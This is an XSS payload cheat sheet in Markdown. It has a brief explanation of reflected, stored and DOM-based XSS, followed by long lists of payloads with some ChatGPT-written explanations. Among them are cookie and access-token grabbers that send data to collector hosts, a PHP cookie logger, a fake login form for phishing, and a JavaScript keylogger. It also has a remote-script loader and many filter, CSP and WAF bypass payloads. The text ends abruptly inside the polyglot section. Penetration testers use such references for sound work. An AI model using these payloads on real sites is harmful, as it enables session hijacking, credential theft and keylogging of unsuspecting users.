# Cross Site Scripting

> Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

## Summary

- [Cross Site Scripting](#cross-site-scripting)
  - [Vulnerability Details](#vulnerability-details)
  - [Exploit code or POC](#exploit-code-or-poc)
    - [Data grabber for XSS](#data-grabber-for-xss)
    - [CORS](#cors)
    - [UI redressing](#ui-redressing)
    - [Javascript keylogger](#javascript-keylogger)
    - [Other ways](#other-ways)
  - [Identify an XSS endpoint](#identify-an-xss-endpoint)
    - [Tools](#tools)
  - [XSS in HTML/Applications](#xss-in-htmlapplications)
    - [Common Payloads](#common-payloads)
    - [XSS using HTML5 tags](#xss-using-html5-tags)
    - [XSS using a remote JS](#xss-using-a-remote-js)
    - [XSS in hidden input](#xss-in-hidden-input)
    - [XSS when payload is reflected capitalized](#xss-when-payload-is-reflected-capitalized)
    - [DOM based XSS](#dom-based-xss)
    - [XSS in JS Context](#xss-in-js-context)
  - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
  - [XSS in files](#xss-in-files)
    - [XSS in XML](#xss-in-xml)
    - [XSS in SVG](#xss-in-svg)
    - [XSS in SVG (short)](#xss-in-svg-short)
    - [XSS in Markdown](#xss-in-markdown)
    - [XSS in SWF flash application](#xss-in-swf-flash-application)
    - [XSS in SWF flash application](#xss-in-swf-flash-application-1)
    - [XSS in CSS](#xss-in-css)
  - [XSS in PostMessage](#xss-in-postmessage)
  - [Blind XSS](#blind-xss)
    - [XSS Hunter](#xss-hunter)
    - [Other Blind XSS tools](#other-blind-xss-tools)
    - [Blind XSS endpoint](#blind-xss-endpoint)
    - [Tips](#tips)
  - [Mutated XSS](#mutated-xss)
  - [Polyglot XSS](#polyglot-xss)
  - [Filter Bypass and exotic payloads](#filter-bypass-and-exotic-payloads)
    - [Bypass case sensitive](#bypass-case-sensitive)
    - [Bypass tag blacklist](#bypass-tag-blacklist)
    - [Bypass word blacklist with code evaluation](#bypass-word-blacklist-with-code-evaluation)
    - [Bypass with incomplete html tag](#bypass-with-incomplete-html-tag)
    - [Bypass quotes for string](#bypass-quotes-for-string)
    - [Bypass quotes in script tag](#bypass-quotes-in-script-tag)
    - [Bypass quotes in mousedown event](#bypass-quotes-in-mousedown-event)
    - [Bypass dot filter](#bypass-dot-filter)
    - [Bypass parenthesis for string](#bypass-parenthesis-for-string)
    - [Bypass parenthesis and semi colon](#bypass-parenthesis-and-semi-colon)
    - [Bypass onxxxx= blacklist](#bypass-onxxxx-blacklist)
    - [Bypass space filter](#bypass-space-filter)
    - [Bypass email filter](#bypass-email-filter)
    - [Bypass document blacklist](#bypass-document-blacklist)
    - [Bypass document.cookie blacklist](#bypass-document-cookie-blacklist)
    - [Bypass using javascript inside a string](#bypass-using-javascript-inside-a-string)
    - [Bypass using an alternate way to redirect](#bypass-using-an-alternate-way-to-redirect)
    - [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
    - [Bypass ">" using nothing](#bypass--using-nothing)
    - [Bypass "<" and ">" using ＜ and ＞](#bypass--and--using--and-)
    - [Bypass ";" using another character](#bypass--using-another-character)
    - [Bypass using HTML encoding](#bypass-using-html-encoding)
    - [Bypass using Katana](#bypass-using-katana)
    - [Bypass using Cuneiform](#bypass-using-cuneiform)
    - [Bypass using Lontara](#bypass-using-lontara)
    - [Bypass using ECMAScript6](#bypass-using-ecmascript6)
    - [Bypass using Octal encoding](#bypass-using-octal-encoding)
    - [Bypass using Unicode](#bypass-using-unicode)
    - [Bypass using UTF-7](#bypass-using-utf-7)
    - [Bypass using UTF-8](#bypass-using-utf-8)
    - [Bypass using UTF-16be](#bypass-using-utf-16be)
    - [Bypass using UTF-32](#bypass-using-utf-32)
    - [Bypass using BOM](#bypass-using-bom)
    - [Bypass using weird encoding or native interpretation](#bypass-using-weird-encoding-or-native-interpretation)
    - [Bypass using jsfuck](#bypass-using-jsfuck)
  - [CSP Bypass](#csp-bypass)
    - [Bypass CSP using JSONP from Google (Trick by @apfeifer27)](#bypass-csp-using-jsonp-from-google-trick-by-apfeifer27)
    - [Bypass CSP by lab.wallarm.com](#bypass-csp-by-labwallarmcom)
    - [Bypass CSP by Rhynorater](#bypass-csp-by-rhynorater)
    - [Bypass CSP by @akita_zen](#bypass-csp-by-akita_zen)
    - [Bypass CSP by @404death](#bypass-csp-by-404death)
  - [Common WAF Bypass](#common-waf-bypass)
    - [Cloudflare XSS Bypasses by @Bohdan Korzhynskyi](#cloudflare-xss-bypasses-by-bohdan-korzhynskyi)
      - [25st January 2021](#25st-january-2021)
      - [21st April 2020](#21st-april-2020)
      - [22nd August 2019](#22nd-august-2019)
      - [5th June 2019](#5th-june-2019)
      - [3rd June 2019](#3rd-june-2019)
    - [Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)](#cloudflare-xss-bypass---22nd-march-2019-by-rakeshmane10)
    - [Cloudflare XSS Bypass - 27th February 2018](#cloudflare-xss-bypass---27th-february-2018)
    - [Chrome Auditor - 9th August 2018](#chrome-auditor---9th-august-2018)
    - [Incapsula WAF Bypass by @Alra3ees- 8th March 2018](#incapsula-waf-bypass-by-alra3ees--8th-march-2018)
    - [Incapsula WAF Bypass by @c0d3G33k - 11th September 2018](#incapsula-waf-bypass-by-c0d3g33k---11th-september-2018)
    - [Incapsula WAF Bypass by @daveysec - 11th May 2019](#incapsula-waf-bypass-by-daveysec---11th-may-2019)
    - [Akamai WAF Bypass by @zseano - 18th June 2018](#akamai-waf-bypass-by-zseano---18th-june-2018)
    - [Akamai WAF Bypass by @s0md3v - 28th October 2018](#akamai-waf-bypass-by-s0md3v---28th-october-2018)
    - [WordFence WAF Bypass by @brutelogic - 12th September 2018](#wordfence-waf-bypass-by-brutelogic---12th-september-2018)
    - [Fortiweb WAF Bypass by @rezaduty - 9th July 2019](#fortiweb-waf-bypass-by-rezaduty---9th-july-2019)
  - [References](#references)

## Vulnerability Details

Cross-Site Scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.

There are 3 main types of XSS attacks:

* **Reflected XSS**: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.

* **Stored XSS**: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.

* **DOM-based XSS**: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.

To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.


## Exploit code or POC

### Data grabber for XSS

Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
```
**ChatGPT Explationation:**  
1. This JavaScript code uses the document.location property to redirect the current page to a new URL, which is constructed by concatenating the string 'http://localhost/XSS/grabber.php?c=' with the document.cookie property. 
2. The document.cookie property is a string containing all the cookies for the current page. 
3. The resulting URL will look something like this: "http://localhost/XSS/grabber.php?c=session_id=abcdef; user_id=123456". 
4. The page is then redirect to this URL which will trigger a GET request to the specified address 'http://localhost/XSS/grabber.php' and passing the cookies as a query parameter 'c'. 
5. The script is sending all the cookies of the current website to a PHP script located on localhost, this script 'grabber.php' can be controlled by the attacker which can be used to steal the cookies and potentially gain unauthorized access to the user's account.
---

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
```
**ChatGPT Explationation:**  
1. This JavaScript code uses the document.location property to redirect the current page to a new URL, which is constructed by concatenating the string 'http://localhost/XSS/grabber.php?c=' with the localStorage.getItem('access_token'). 
2. The localStorage.getItem('access_token') is a method to retrieve the value of the key 'access_token' from the local storage of the current website. The resulting URL will look something like this: "http://localhost/XSS/grabber.php?c=access_token_value". 
3. The page is then redirect to this URL which will trigger a GET request to the specified address 'http://localhost/XSS/grabber.php' and passing the access token as a query parameter 'c' . 
4. The script is sending access token from the local storage of the current website to a PHP script located on localhost, this script 'grabber.php' can be controlled by the attacker which can be used to steal the access token and potentially gain unauthorized access to the user's account or sensitive data.
---

```html
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
```
**ChatGPT Explationation:**  
1. This JavaScript code creates a new Image object, and sets its src property to a URL constructed by concatenating the string 'http://localhost/cookie.php?c=' with the document.cookie property. 
2. The document.cookie property is a string containing all the cookies for the current page. The resulting URL will look something like this: "http://localhost/cookie.php?c=session_id=abcdef; user_id=123456". 
3. When the src property is set, it triggers a GET request to the specified URL, which passes the current page's cookies as a query parameter 'c'. 
4. This GET request will be sent to the server 'localhost' and the script 'cookie.php' will be executed which can be controlled by attacker. 
5. This script is used to steal the cookies of the current website and send it to an attacker-controlled server. 
6. The attacker can use these cookies to impersonate the victim and potentially gain unauthorized access to their account.
---

```html
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```
**ChatGPT Explationation:**  
1. This JavaScript code creates a new Image object, and sets its src property to a URL constructed by concatenating the string 'http://localhost/cookie.php?c=' with the localStorage.getItem('access_token'). 
2. The localStorage.getItem('access_token') is a method to retrieve the value of the key 'access_token' from the local storage of the current website. The resulting URL will look something like this: "http://localhost/cookie.php?c=access_token_value". 
3. When the src property is set, it triggers a GET request to the specified URL, which passes the access token from the local storage as a query parameter 'c'. 
4. This GET request will be sent to the server 'localhost' and the script 'cookie.php' will be executed which can be controlled by attacker. 
5. This script is used to steal the access token from the local storage of the current website and send it to an attacker-controlled server. 
6. The attacker can use this access token to gain unauthorized access to sensitive data or user's account.
---

Write the collected data into a file.

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```
**ChatGPT Explanation:**  
1. This is a PHP script that is designed to receive a cookie value as a GET parameter named 'c', and writes it to a file called 'cookies.txt' in the same directory. 
2. When the script is executed, it first retrieves the value of the 'c' GET parameter by using the PHP built-in variable $_GET['c'], and assigns it to a variable called $cookie. 
4. Then it opens a file named 'cookies.txt' in append mode using the 'fopen' function and assigns the file pointer to a variable called $fp. 
5. Then it writes the value of the cookie to the file, by using the 'fwrite' function, along with the string 'Cookie:', so that it can be easily identified. Finally, it closes the file using the 'fclose' function. 
6. This script can be used by attacker to steal the cookies of the current website and save it to a file called 'cookies.txt' on the server, which can be used later to impersonate the victim and potentially gain unauthorized access to their account.
---


### CORS

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```
**ChatGPT Explanation:**  
1. This JavaScript code uses the fetch function to send a POST request to a specified URL (in this case, https://<SESSION>.burpcollaborator.net) with the current document's cookies as the request body. 
2. The mode: 'no-cors' option is included to bypass the same-origin policy, which would otherwise block the request. 
3. This allows the attacker to send the victim's cookies to a server under their control. 
4. If the victim is currently logged in to the website, the attacker can use the stolen cookies to impersonate the victim and potentially gain unauthorized access to their account.


### UI redressing

Leverage the XSS to modify the HTML content of the page in order to display a fake login form.

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```
**ChatGPT Explanation:**  
This JavaScript code is doing the following:

1. Using the history.replaceState method, it modifies the current page's URL to be "../../../login".
2. Using the document.body.innerHTML property, it replaces the entire contents of the current page's body with a new HTML code. The new HTML code creates a login form with two input fields for username and password and a submit button.
3. When the user loads the page it will be redirected to the login page and the login form will be displayed.
4. When the user fills in the form and presses submit, the browser will send a request to the server with the provided username and password.
5. The server will validate the user credentials and either allow the user to continue or redirect them back to the login page.

It is important to note that the script is modifying the current page and replacing it with a login form that is not legitimate. This is a potential attack vector, known as phishing, since the user may enter their credentials into the form and send it to the attacker.

---



### Javascript keylogger

Another way to collect sensitive data is to set a javascript keylogger.

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```
**ChatGPT Explanation:**  
This HTML code creates an img element with a src attribute set to x. When the browser tries to load this image, it will encounter an error because the image does not exist at the specified location. As a result, the onerror event will trigger and execute the JavaScript code provided in the onerror attribute.

The JavaScript code does the following:

1. It assigns an anonymous function to the document.onkeypress event. This function will be executed every time a key is pressed on the keyboard.
2. The function captures the key press event and retrieves the ASCII code of the pressed key from the e.which property.
3. The ASCII code is then passed to the String.fromCharCode method, which converts the code to the corresponding character.
4. The character is then passed as a query parameter to the URL http://domain.com?k=
5. The script then uses the fetch method to send a GET request to the specified URL and passes the pressed key as a query parameter.
6. The script then uses the this.remove() method to remove the img element from the page, so that the script will only execute once.

This script can be used as a keylogger by attacker, it captures every key pressed on the keyboard and sends it to the attacker's server, which can be used to capture sensitive information like passwords, credit card numbers, and personal data.

---

### Other ways

More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [.NET Shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)

## Identify an XSS endpoint

This payload opens the debugger in the developer console rather than triggering a popup alert box.

```javascript
<script>debugger;</script>
```

Modern applications with content hosting can use [sandbox domains][sandbox-domains]

> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.

[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html

For this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.

Better payload replacing `<script>alert(1)</script>`:

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developer console (doesn't require any interaction).

Example:

```html
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

References:

- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)

### Tools 

Most tools are also suitable for blind XSS attacks:

* [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
* [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
* [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
* [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
* [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester

## XSS in HTML/Applications

### Common Payloads

```javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

### XSS using HTML5 tags

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
```

### XSS using a remote JS

```html
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
```
**ChatGPT Explationation:**  
1. The JavaScript code uses the fetch() method to send an HTTP GET request to the specified host ("//host/a") to XSS payload.
2. Once the XSS payload is retrieved, it uses .text() method to parse the response as text. 
3. The final step is to use the eval() function to execute the text as JavaScript code.

---

```html
<script src=14.rs>
// you can also specify an arbitrary payload with 14.rs/#payload
e.g: 14.rs/#alert(document.domain)
```

### XSS in hidden input

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
Use CTRL+SHIFT+X to trigger the onclick event
```
**ChatGPT Explationation:**  
1. The input element is used to create form controls for web pages, such as text fields, checkboxes, and buttons. In this case, the type of the input element is "hidden", which means that it will not be visible on the page and the user will not be able to interact with it directly.
2. The "accesskey" attribute allows you to specify a shortcut key to activate or focus the element. In this case, the accesskey is "X", which means that if the user press "Alt+X" the focus will be on this element.
3. The onclick event triggers a JavaScript alert() function when the element is clicked. This will display an alert box with the text "1" to the user.
---

### XSS when payload is reflected capitalized

```javascript
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

### DOM based XSS

Based on a DOM XSS sink.

```javascript
#"><img src=/ onerror=alert(2)>
```

### XSS in JS Context

```javascript
-(confirm)(document.domain)//
; alert(1);//
// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
```

## XSS in wrappers javascript and data URI

XSS with javascript:

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

We can encode the "javascript:" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

Using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

XSS with data:

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

XSS with vbscript: only IE

```javascript
vbscript:msgbox("XSS")
```

## XSS in files

** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### XSS in XML

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

### XSS in SVG

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

### XSS in SVG (short)

```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

### XSS in Markdown

```csharp
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

### XSS in SWF flash application

```powershell
Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
```

more payloads in ./files

### XSS in SWF flash application

```
flashmediaelement.swf?jsinitfunctio%gn=alert`1`
flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
plupload.flash.swf?%#target%g=alert&uid%g=XSS&
moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
video-js.swf?readyFunction=alert(1)
player.swf?playerready=alert(document.cookie)
player.swf?tracecall=alert(document.cookie)
banner.swf?clickTAG=javascript:alert(1);//
io.swf?yid=\"));}catch(e){alert(1);}//
video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
```

### XSS in CSS

```html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

## XSS in PostMessage

> If the target origin is asterisk * the message can be sent to any domain has reference to the child page.

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

## Blind XSS

### XSS Hunter

XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app). You can set up an alternative version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)

> XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.

```xml
"><script src=//<your.subdomain>.xss.ht></script>
<script>$.getScript("//<your.subdomain>.xss.ht")</script>
```

### Other Blind XSS tools

- [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
- [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
- [ezXSS - ssl](https://github.com/ssl/ezXSS)

### Blind XSS endpoint

- Contact forms
- Ticket support
- Referer Header
  - Custom Site Analytics
  - Administrative Panel logs
- User Agent
  - Custom Site Analytics
  - Administrative Panel logs
- Comment Box
  - Administrative Panel

### Tips

You can use a [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.

Eg. payload

```html
<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
```

Eg. one-line HTTP server:

```
$ ruby -run -ehttpd . -p8080
```

## Mutated XSS

Use browsers quirks to recreate some HTML tags when it is inside an `element.innerHTML`.

Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/.

```javascript
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## Polyglot XSS

Polyglot XSS - 0xsobky

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Polyglot XSS - Ashar Javed

```javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

Polyglot XSS - Mathias Karlsson

```javascript
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```

Polyglot XSS - Rsnake

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

Polyglot XSS - Daniel Miessler

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
```

Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
![https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg](https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg)

```javascript
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
```

![https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large](https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large)

```javascript
<svg%0Ao%00nload=%09((pro\u006dpt))()//
```

Polyglot XSS - from [@filedescriptor's Polyglot Challenge](http://polyglot.innerht.ml)

```javascript
# by crlf
